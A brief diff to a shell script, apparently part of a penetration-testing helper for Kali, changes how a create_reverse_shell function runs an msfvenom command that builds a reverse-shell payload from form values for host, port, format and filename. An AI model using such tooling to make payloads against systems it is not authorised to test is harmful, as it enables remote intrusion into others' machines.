@@ -16,6 +16,6 @@ create_reverse_shell() {
     LPORT=${form_data["LPORT"]}
     FILENAME=${form_data["filename"]}
 
-    paste_command "msfvenom -p ${PAYLOAD} LHOST=${KALI_IP} LPORT=${LPORT} -f ${FORMAT} -o ${FILENAME}"
-    xdotool key Return
+    execute_command "msfvenom -p ${PAYLOAD} LHOST=${KALI_IP} LPORT=${LPORT} -f ${FORMAT} -o ${FILENAME}"
+    create_new_line
 }
